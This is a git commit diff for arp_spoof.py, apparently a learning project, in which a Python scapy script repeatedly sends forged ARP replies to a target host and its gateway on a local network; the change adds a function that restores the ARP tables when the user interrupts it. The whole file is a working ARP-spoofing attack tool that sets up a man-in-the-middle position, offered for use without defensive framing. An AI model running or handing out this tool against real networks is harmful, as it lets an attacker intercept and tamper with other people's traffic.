b437cb3498166fd2f07739200df81072ed7422dd
iw4p <nimakbarzade@yahoo.com>
2019-07-18 09:45:04 -0400

    add restore

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 import time
+import sys
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -18,11 +19,27 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
-counter = 0
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
-while True:
-    spoof("192.168.1.5", "192.168.1.1")
-    spoof("192.168.1.1", "192.168.1.5")
-    counter = counter + 2
-    print(" [+] Packets sent: " + str(counter))
-    time.sleep(2)
+
+target_ip = "192.168.1.5"
+gateway_ip = "192.168.1.1"
+
+try:
+    counter = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        counter = counter + 2
+        print("\r[+] Packets sent: " + str(counter)),
+        sys.stdout.flush()
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
